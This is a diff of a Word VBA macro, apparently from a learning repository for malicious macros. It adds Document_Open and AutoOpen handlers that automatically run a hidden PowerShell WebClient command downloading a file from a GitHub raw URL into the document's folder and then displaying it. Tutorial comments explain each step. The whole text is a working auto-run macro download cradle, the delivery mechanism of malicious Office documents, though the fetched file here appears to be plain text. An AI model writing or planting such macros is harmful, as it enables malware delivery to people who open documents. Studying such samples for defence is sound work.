@@ -7,25 +7,37 @@
 'You can call the class inline with System.Net.WebClient (comes from the dll/assembly System.Net.WebClient.dll, as class if not instantiated).
 
 Sub Document_Open()
+  PSCradle
+End Sub
+ 
+Sub AutoOpen()
+  PSCradle
+End Sub
+
+Sub PSCradle()
 
 Dim str As String
-str = "powershell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/P4nr4g3/Mal-VBA/main/Descriptions.txt','macro.txt')"
-Shell str, vbHide
+  str = "powershell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/P4nr4g3/Mal-VBA/main/Descriptions.txt','macro.txt')"
+  Shell str, vbHide
 
 'The ActiveDocument.Path property allows a user to get the location of the current document. This can then be appended with the downloaded file.
 'The file downloaded using the Macro in a document will be downloaded in the directory of the document itself.
 
-
 Dim filepath As String
-filepath = ActiveDocument.Path + "\macro.txt"
+  filepath = ActiveDocument.Path + "\macro.txt"
+  Wait (2)
+  Shell "type " + filepath, vbNormalFocus
+End Sub
 
 Sub Wait(n As Long)
+'Long Variable is used to stored long data values.
 Dim t As Date
 t = Now
 Do
-DoEvents
+    DoEvents
+'DoEvents is a VBA Command that pauses the macro to refesh the screen and execute any pending excel events.
+'DateAdd allows seconds, hours, days etc. to be added to the current time. "s" denotes time period. n is the variable for how many. and t is the time to add to.
+
 Loop Until Now >= DateAdd("s", n, t)
 
 End Sub
-
-
